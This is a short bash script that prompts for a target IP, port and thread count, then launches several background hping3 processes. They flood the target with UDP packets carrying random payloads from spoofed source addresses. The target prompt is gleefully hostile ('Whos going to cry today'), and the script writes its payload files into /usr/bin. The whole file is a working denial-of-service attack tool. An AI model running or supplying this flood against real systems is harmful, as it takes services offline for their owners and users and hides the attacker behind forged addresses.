#! /bin/bash

echo "###################### Flood of random (but identical across packet) payload. ######################"
echo -en "Whos going to cry today (IP):"
read tarip
echo -en ENTER PORT NUMBER:
read port
echo -en ENTER NUMBER OF HPING THREADS:
read count
echo "################# STARTING THREADS #################################################################"
#packet=$1
#port=$2
#count=$3

cd /usr/bin
for i in `seq 1 $count`;
do
python -c "import random, sys;
sys.stdout.write(''.join(['\\\x{0:02x}'.format(random.randint(0,255)) for _ in range(20)]))" > udp_payload$i
hping3 $tarip --udp -p $port --flood -I eth1 --rand-source -d 20 -E udp_payload$i &
done
